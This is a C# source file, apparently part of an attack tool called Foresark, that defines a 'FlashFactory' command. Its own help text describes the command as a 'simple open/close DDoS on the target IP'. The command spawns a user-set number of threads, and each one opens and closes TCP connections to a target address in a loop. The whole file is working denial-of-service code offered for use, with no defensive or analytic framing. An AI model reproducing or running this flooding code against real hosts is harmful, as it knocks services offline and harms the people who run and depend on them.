using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Foresark.Commands
{
    class FlashFactory : Command
    {
        private static readonly string[] requiredParameters = { "power" };

        private static readonly string[] parametersDescription = {
            "Specify how much sockets will be working on DDoS"
        };

        public static Boolean flashFactory;

        public FlashFactory() : base() { }
        public FlashFactory(Dictionary<string, string> parameters) : base(parameters) { }

        public override object action()
        {
            String power = this.GetParameter("power");
            int socketPower = 1;
            if (power != null) 
                socketPower = int.Parse(this.GetParameter("power"));
            flashFactory = !flashFactory;
            if (flashFactory)
            {
                for (int i = 0; i < socketPower; i++)
                {
                    Thread sockets = new Thread(this.doFactory);
                    sockets.Start();
                }
            }
            return null;
        }

        public override void help()
        {
            Output.printMsg("[cyan]FLASHFACTORY[/cyan]");
            this.PrintRequiredParameters(requiredParameters, parametersDescription);
            Output.printMsg("Start a simple open/close DDoS on the target IP");
            Output.printMsg("[yellow]Must have an opened connection to work[/yellow]");
        }

        public override string ToString()
        {
            return "Start a simple open/close DDoS on the target IP";
        }

        public void doFactory()
        {
            TcpClient socket = new TcpClient();
            while (flashFactory)
            {
                try
                {
                    socket.Connect(Foresark.targetIP, Foresark.targetPort);
                }
                catch (SocketException e)
                {
                    socket.Client.Close();
                }
                if (socket.Connected)
                {
                    socket.Client.Close();
                }
            }
        }
    }
}
